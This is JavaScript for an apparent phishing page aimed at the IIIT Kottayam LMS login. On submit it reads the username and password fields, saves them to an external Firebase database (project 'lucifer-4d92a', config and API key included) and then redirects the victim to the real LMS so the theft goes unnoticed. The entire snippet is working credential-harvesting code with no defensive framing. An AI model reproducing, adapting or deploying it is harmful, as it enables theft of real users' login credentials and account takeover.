
  const firebaseConfig = {
    apiKey: "AIzaSyAfR7D-zqTTNb7KAPMFM49hV2qYqNiwhj8",
    authDomain: "lucifer-4d92a.firebaseapp.com",
    databaseURL: "https://lucifer-4d92a-default-rtdb.firebaseio.com",
    projectId: "lucifer-4d92a",
    storageBucket: "lucifer-4d92a.appspot.com",
    messagingSenderId: "1048691561211",
    appId: "1:1048691561211:web:a387b0de5e2faaf272d65e"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  var LuciferDB=firebase.database().ref('Lucifer');

  document.getElementById('Lucifer').addEventListener("submit",submitForm);
  document.getElementById('Lucifer').addEventListener("submit",redirectto);

  function submitForm(e){
    e.preventDefault();

    var name=getElement('username');
    var pass=getElement('password');
    savedata(name,pass);

  }

  const getElement= (id)=>{
    return document.getElementById(id).value;
  }

  const savedata=(name,pass)=>{ 
    var newLucifer=LuciferDB.push();

    newLucifer.set({
      name:name,
      password:pass
    });

  }

  function redirectto(){
    window.location.href=("https://lms.iiitkottayam.ac.in/");
  }


  

